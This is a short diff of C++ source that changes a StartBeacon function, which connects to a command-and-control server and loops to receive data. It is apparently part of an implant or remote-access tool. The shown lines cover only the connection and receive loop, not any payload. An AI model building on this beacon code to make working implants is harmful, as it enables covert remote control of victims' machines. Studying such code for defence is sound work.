@@ -149,19 +149,19 @@ void StartBeacon(char* C2Server, int C2Port)
 		SOCK_STATE = connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr));
 		std::cout << "[DBG] Connected to " << C2Server << ":" << C2Port << std::endl;
 
-		while (true) {
-				
-			// This if statement performs connection and triggers if connection to C&C errored out.
-			if (SOCK_STATE==SOCKET_ERROR) {
-				std::cout << "[-] Socket created with error..\n";
-				closesocket(tcpsock);
-				WSACleanup();
-				continue;
-			}
+		// This if statement performs connection and triggers if connection to C&C errored out.
+		if (SOCK_STATE==SOCKET_ERROR) {
+			std::cout << "[-] Socket created with error..\n";
+			closesocket(tcpsock);
+			WSACleanup();
+			continue;
+		}
 
-			// Else connection successfull..
-			else {
-				// ----------------
+		// Else connection successfull..
+		else {
+			// ----------------
+			while (true) {
+				
 				// Connection verification block START
 				char RecvData[1024] = "";
 				memset(RecvData, 0, sizeof(RecvData));
